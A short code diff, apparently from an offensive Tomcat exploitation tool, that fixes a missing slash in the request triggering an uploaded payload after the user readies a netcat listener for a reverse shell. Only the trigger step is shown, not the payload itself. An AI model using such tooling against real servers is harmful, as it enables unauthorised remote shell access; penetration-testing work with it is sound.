@@ -250,7 +250,7 @@ class authenticated_attack(tomcat):
                         is_netcat_ready = input()
 
                     output.message(state="success", description="Send revershell", clear_before=False)
-                    response = requests.get(url=f"{self.url}{filename}/")
+                    response = requests.get(url=f"{self.url}/{filename}/")
                     if response.status_code == 200:
                         output.message(state="exit", description="See you next time!", clear_before=False)
                     else:
